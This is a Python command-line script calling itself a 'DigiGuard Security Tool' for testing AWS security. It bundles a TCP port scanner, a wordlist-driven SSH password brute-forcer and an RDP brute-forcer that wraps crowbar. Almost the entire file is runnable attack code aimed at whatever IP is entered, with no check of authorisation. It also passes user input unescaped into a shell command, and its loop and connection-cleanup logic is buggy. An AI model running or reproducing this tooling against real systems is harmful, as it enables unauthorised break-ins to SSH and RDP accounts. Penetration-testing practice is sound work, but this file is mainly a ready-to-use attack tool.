#!/usr/bin/env python3

# Script Name:                  DigiGuard Security Tool
# Author:                       David Prutch
# Date of latest revision:      08/07/2023
# Purpose:                      Test AWS security functions against Brute Force Attacks.

#This is designed to be run on Kali Linux with Python installed.
# This script requires crowbar to be downloaded and installed from https://github.com/galkan/crowbar 
# Installation and use instructions are included on the site.

# Import Libraries
from fabric import Connection
import socket
import time
import subprocess

# Define Functions

# Function for Port Scanning
def port_scan():
    target_host = input("Enter the target host IP address: ")
    target_ports = input("Enter the target ports (comma-separated): ").split(',')

    open_ports = []
    for port in target_ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                result = s.connect_ex((target_host, int(port)))
                if result == 0:
                    open_ports.append(port)
        except Exception as e:
            pass

    if open_ports:
        print(f"Open ports on {target_host}: {', '.join(open_ports)}")
    else:
        print("No open ports found.")

# Function for SSH Brute Force using fabric
def ssh_brute_force():
    # Prompt user for SSH server IP address
    ssh_ip = input("Enter the SSH server IP address: ")

    # Prompt user for the word list file path
    word_list_path = input("Enter the word list file path: ")
    # Read the word list from the file
    with open(word_list_path, 'r') as word_file:
        words = word_file.read().splitlines()

    # Prompt user for the usernames file path
    usernames_file_path = input("Enter the usernames file path: ")
    # Read the usernames from the file
    with open(usernames_file_path, 'r') as user_file:
        usernames = user_file.read().splitlines()

    # Iterate through each word in the list and each username, attempting SSH login
    for word in words:
        word = word.strip()
        for username in usernames:
            username = username.strip()
            try:
                with Connection(host=ssh_ip, user=username, connect_kwargs={"password": word}) as conn:
                    # Try running a simple command to check if the login is successful
                    result = conn.run("echo 'Successful SSH login.'", hide=True)
                    if result.ok:
                        print(f"SSH Login successful! Username: {username}, Password: {word}")
                        # Exit the loop if successful login
                        break
            except Exception as e:
                print(f"SSH Login failed for Username: {username}, Password: {word}")
            finally:
                # Close the SSH connection regardless of the outcome
                conn.close()

# Function for RDP Brute Force
def rdp_brute_force():
    # Prompt user for the RDP server IP address
    # This requires CIDR notation 
    # To test a subnet use the actual subnet example: /24
    # to test a single IP address use /32
    rdp_ip = input("Enter the RDP server IP address: ")

    # Prompt user for the known username
    known_username = input("Enter the known username: ")

    # Prompt user for the word list file path
    word_list_path = input("Enter the word list file path: ")

    try:
        # Build the crowbar command with the provided parameters
        # Adjust the path to the "crowbar" executable based on its location on your Kali Linux machine
        crowbar_cmd = f'/usr/bin/crowbar -b rdp -s {rdp_ip} -u {known_username} -C {word_list_path}'

        # Run crowbar in the command prompt
        process = subprocess.Popen(crowbar_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # Wait for the process to complete
        stdout, stderr = process.communicate()

        # Print the output of crowbar
        print(stdout.decode())
        print(stderr.decode())

        # Check the process return code to determine if the brute force completed
        if process.returncode == 0:
            print("RDP brute force completed successfully.")
        else:
            print("RDP brute force failed.")

    except Exception as e:
        print(f"Error: {e}")

# Main
while True:
    print("Choose a mode:")
    print("1. Port Scan")
    print("2. SSH Brute Force")
    print("3. RDP Brute Force")
    print("4. Exit")

    # Read the chosen mode number
    mode = int(input("Enter mode number: "))

    if mode == 1:
        # Call port_scan function
        port_scan()
    elif mode == 2:
        # Call ssh_brute_force function
        ssh_brute_force()
    elif mode == 3:
        # Call rdp_brute_force function
        rdp_brute_force()
    elif mode == 4:
        # Exit the loop
        break
    else:
        # Print an error message if an invalid mode number is entered
        print("Invalid mode number. Please try again.")